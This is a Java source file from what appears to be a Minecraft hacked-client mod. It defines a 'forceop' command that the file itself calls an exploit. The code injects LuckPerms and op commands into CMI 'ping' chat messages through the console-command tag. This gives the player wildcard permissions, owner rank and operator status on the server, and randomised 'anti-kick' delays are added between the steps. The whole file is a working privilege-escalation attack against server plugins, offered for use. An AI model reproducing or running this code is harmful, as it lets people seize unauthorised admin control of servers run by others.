package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;

import java.util.Objects;
import java.util.Random;

public class ForceOPCommand extends Command {

    private final Random random = new Random();

    public ForceOPCommand() {
        super("forceop", "Force OP via CMI Console Sender + LP chain exploit");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
            new Thread(() -> {
                try {
                    MinecraftClient client = MinecraftClient.getInstance();
                    String username = client.getSession().getUsername();

                    sendObfuscatedCMIPayload("lp user " + username + " permission set * true");
                    Thread.sleep(600 + random.nextInt(200)); // Anti-kick delay

                    sendObfuscatedCMIPayload("lp user " + username + " parent add owner");
                    Thread.sleep(600 + random.nextInt(200)); // Extra fallback

                    sendObfuscatedCMIPayload("op " + username);
                    Thread.sleep(600 + random.nextInt(200));

                    // Optional log
                    System.out.println("[ForceOP] Attempted OP grant and permission escalation for: " + username);
                } catch (Exception e) {
                    System.err.println("[ForceOP] Error while sending payloads: " + e.getMessage());
                }
            }).start();
            return SINGLE_SUCCESS;
        });
    }

    /**
     * Sends a disguised CMI ping payload.
     */
    private void sendObfuscatedCMIPayload(String command) {
        String payload = "<T>Click me!</T><CC>" + command + "</CC>";
        String chatCommand = "cmi ping " + payload;
        Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand(chatCommand);
    }
}
